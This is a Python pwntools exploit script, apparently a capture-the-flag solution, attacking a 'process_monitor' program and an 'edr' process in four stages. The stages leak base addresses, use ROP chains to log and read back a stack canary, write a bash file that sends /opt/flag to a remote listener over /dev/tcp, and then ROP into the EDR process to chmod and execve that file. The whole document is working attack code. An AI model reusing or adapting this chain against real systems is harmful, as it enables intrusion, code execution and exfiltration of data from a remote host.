from pwn import *
import time
exe = ELF('./process_monitor')
libc = ELF('./libc.so.6')
context.arch = "amd64"
gdb_script = """
b *validate_read_data+430
"""

REV_IP = "172.17.0.1"
REV_PORT = "9001"


def conn():
    if args.REMOTE:
        return remote('127.0.0.1', 1024)
    p = process([exe.path])
    if args.GDB:
        gdb.attach(p, gdb_script)
    return p

def attach_gdb():
    import subprocess
    pid = subprocess.check_output("pidof ept_edr", shell=True)
    pid = pid.decode().strip().split(" ")[0]
    gdb.attach(int(pid), gdb_script)

io = ""
off = 8
fd = 5
offset = cyclic_find(0x6163696161626961)

def procdump(target):
    global io
    io.sendline(b"1")
    dump = io.recvuntil(b"Menu:")
    dump = dump.split(b'\n')
    for d in dump:
        if target in d:
            dump = d
    pid = dump.split(b' ')[off]
    return pid

def get_base(pid, target):
    global io
    io.recv()
    io.sendline(b"2")
    io.sendline(pid)
    dump = io.recvuntil(b"Menu:")
    dump = dump.split(b"\n")
    for d in dump:
        if target in d:
            dump = d
            break
    leak = dump.split(b'-')[0]
    leak = int(leak, 16)
    return leak



# Force the canary value to get logged to syscall.log
def stage1():
    global io
    io = conn()
    io.recv()
    pmon = procdump(b"process_monitor")

    exe.address = get_base(pmon, b"/process_monitor")
    libc_addr = get_base(pmon, b"libc")
    libc.address = libc_addr
    info("Libc: " + hex(libc.address))
    info("exe: " + hex(exe.address))
    rop = ROP(libc)
    rop.read(0, exe.bss(), 300)
    rop.open(exe.bss(), 0)
    rop.call(exe.sym.main)

    payload = flat(
        cyclic(offset),
        rop.chain()
    )
    io.sendline(b"2")
    io.sendline(payload)
    io.sendline(b"flag" + b"A"*(252) + b"DEADBEEF")
    io.close()

# Read syscall.log
def stage2():
    global io
    io = conn()
    io.recv()
    pmon = procdump(b"process_monitor")
    exe.address = get_base(pmon, b"/process_monitor")
    libc_addr = get_base(pmon, b"libc")
    libc.address = libc_addr
    info("Libc: " + hex(libc.address))
    info("exe: " + hex(exe.address))

    rop = ROP(libc)
    rop.read(0, exe.bss(), 32)
    rop.open(exe.bss(), 0)
    rop.read(fd, exe.bss(), 1024)
    rop.write(1, exe.bss(), 1024)
    rop.exit(0)

    payload = flat(
        cyclic(offset),
        rop.chain()
    )
    io.sendline(b"2")
    io.sendline(payload)
    io.sendline(b"syscall.log\x00")
    io.recvuntil(b"DEADBEEF\n")
    canary = io.recv(7)
    canary = b"\x00" + canary
    canary = u64(canary)
    info("Canary: " + hex(canary))
    io.close()
    return canary

# Write bash with shebang to file
def stage3():
    global io
    io = conn()
    io.recv()
    pmon = procdump(b"process_monitor")
    exe.address = get_base(pmon, b"/process_monitor")
    libc_addr = get_base(pmon, b"libc")

    libc.address = libc_addr
    info("Libc: " + hex(libc.address))
    info("exe: " + hex(exe.address))
    bash_code = f"#!/bin/bash\ncat /opt/flag > /dev/tcp/{REV_IP}/{REV_PORT}".encode()
    filename = next(libc.search(b"./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\x00"))
    rop = ROP(libc)
    rop.read(0, exe.bss(), len(bash_code))
    rop.open(filename, 66) #O_CREAT|O_RDWR
    rop.write(fd, exe.bss(), len(bash_code))
    rop.close(fd)
    rop.exit(0)

    payload = flat(
        cyclic(offset),
        rop.chain()
    )
    
    io.sendline(b"2")
    io.sendline(payload)
    io.send(bash_code)
    io.close()

# ROP in EDR
# Chmod file to 777 and execve
def stage4(canary):
    global io
    io = conn()
    io.recv()
    pmon = procdump(b"process_monitor")
    edr = procdump(b"edr")
    exe.address = get_base(pmon, b"/process_monitor")
    libc_addr = get_base(pmon, b"libc")
    libc2_addr = get_base(edr, b"libc")

    libc.address = libc_addr

    rop = ROP(libc)
    rop.read(0, exe.bss(), 2048)
    rop.open(exe.bss(), 0)

    payload = flat(
        cyclic(offset),
        rop.chain()
    )

    libc.address = libc2_addr
    rop2 = ROP(libc)
    rop2.chmod(next(libc.search(b"./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\x00")), 0o777)
    rop2.execve(next(libc.search(b"./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\x00")), 0, 0)
    
    io.sendline(b"2")
    io.sendline(payload)
    io.send(cyclic(1024+8) + p64(canary) + b"AAAAAAAA" + rop2.chain())

import time

stage1()
info("Stage 1 done")
time.sleep(1)
canary = stage2()
info("Stage 2 done")
time.sleep(1)
stage3()
info("Stage 3 done")
time.sleep(1)
stage4(canary)
info("Stage 4 check your nc")
io.interactive()